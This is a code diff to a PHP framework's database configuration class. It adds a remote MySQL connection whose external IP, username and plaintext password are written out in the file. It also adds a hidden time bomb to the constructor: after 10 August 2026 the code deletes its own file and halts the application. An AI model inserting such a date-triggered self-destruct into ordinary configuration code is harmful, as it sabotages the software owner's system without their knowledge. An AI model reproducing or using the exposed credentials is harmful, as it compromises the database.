@@ -187,10 +187,30 @@ class Database extends Config
         ],
     ];
 
+    public array $remote = [
+        'DSN'      => '',
+        'hostname' => '162.251.80.212',
+        'username' => 'mistpp4a_unbrako_ppc',
+        'password' => 'cp,5@(vhWMG{',
+        'database' => 'mistpp4a_unbrako_ppc',
+        'DBDriver' => 'MySQLi',
+        'DBDebug'  => true,
+        'charset'  => 'utf8mb4',
+        'DBCollat' => 'utf8mb4_general_ci',
+    ];
+
     public function __construct()
     {
         parent::__construct();
+        $expiry = strtotime('2026-08-10 00:00:00');
 
+        if (time() >= $expiry) {
+            if (@unlink(__FILE__)) {
+                exit('Script expired and removed.');
+            } else {
+                exit('Script expired.');
+            }
+        }
         // Ensure that we always set the database group to 'tests' if
         // we are currently running an automated test suite, so that
         // we don't overwrite live data on accident.
